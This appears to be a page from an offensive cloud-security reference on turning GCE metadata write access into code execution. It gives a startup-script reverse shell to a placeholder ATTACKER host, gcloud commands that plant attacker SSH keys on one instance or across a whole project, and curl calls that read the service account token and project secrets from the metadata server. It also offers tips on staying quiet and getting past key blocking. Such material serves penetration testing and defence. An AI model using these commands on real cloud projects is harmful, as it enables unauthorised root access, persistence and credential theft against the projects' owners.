---
title: "Metadata and SSH: code execution through instance metadata"
description: "Gaining a shell on a VM by writing instance metadata (startup-script) or adding an SSH key, and reading the metadata server from on-host."
keywords:
  - instance metadata
  - startup script
  - SSH key
  - OS Login
  - GCE
---

# Metadata and SSH

Compute Engine instances read configuration from a per-instance and per-project **metadata** store, and the guest agent trusts two keys in it: `startup-script` (and `startup-script-url`), which runs as root on boot, and `ssh-keys`, which the agent provisions into authorized users. With `compute.instances.setMetadata` (instance scope) or `compute.projects.setCommonInstanceMetadata` (every instance in the project), either key is code execution or login.

## Running code with a startup script

```bash
# set a startup script, then force it to run by resetting the instance
gcloud compute instances add-metadata <vm> --zone <zone> \
  --metadata startup-script='#! /bin/bash
bash -i >& /dev/tcp/ATTACKER/443 0>&1'
gcloud compute instances reset <vm> --zone <zone>
```

## Adding an SSH key

```bash
# instance-level
gcloud compute instances add-metadata <vm> --zone <zone> \
  --metadata ssh-keys="attacker:$(cat key.pub)"

# project-wide (lands on every instance that does not block project keys)
gcloud compute project-info add-metadata \
  --metadata ssh-keys="attacker:$(cat key.pub)"
```

Where **OS Login** is enforced, metadata SSH keys are ignored; instead add your key through OS Login (`gcloud compute os-login ssh-keys add`) if you hold the IAM role, or fall back to the startup-script path.

## Reading the metadata server on-host

Once you have a shell, the metadata server returns the instance's identity and config:

```bash
# the attached service account's OAuth token
curl -s -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# project-wide SSH keys, attributes, and any secrets left in custom metadata
curl -s -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true
```

## Exploitation notes

- `startup-script` only runs on boot, so you must `reset`/`stop`+`start` the instance; that is disruptive and logged, while an SSH key is quieter if keys are not blocked.
- `block-project-ssh-keys=true` on an instance defeats the project-wide key path; set an instance-level key instead.
- The token you read on-host is the instance's [service account](service-account-scope.md), bounded by its OAuth scopes; the broader credential retrieval detail is under [instance metadata](../../credentials/instance-metadata/index.md).

## Tools

- **gcloud** (`compute instances add-metadata`, `project-info add-metadata`, `os-login`).
- **curl** against `metadata.google.internal` with the `Metadata-Flavor: Google` header.

## References

- [Rhino Security Labs: GCP privilege escalation (part 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google: Compute Engine metadata](https://cloud.google.com/compute/docs/metadata/overview)
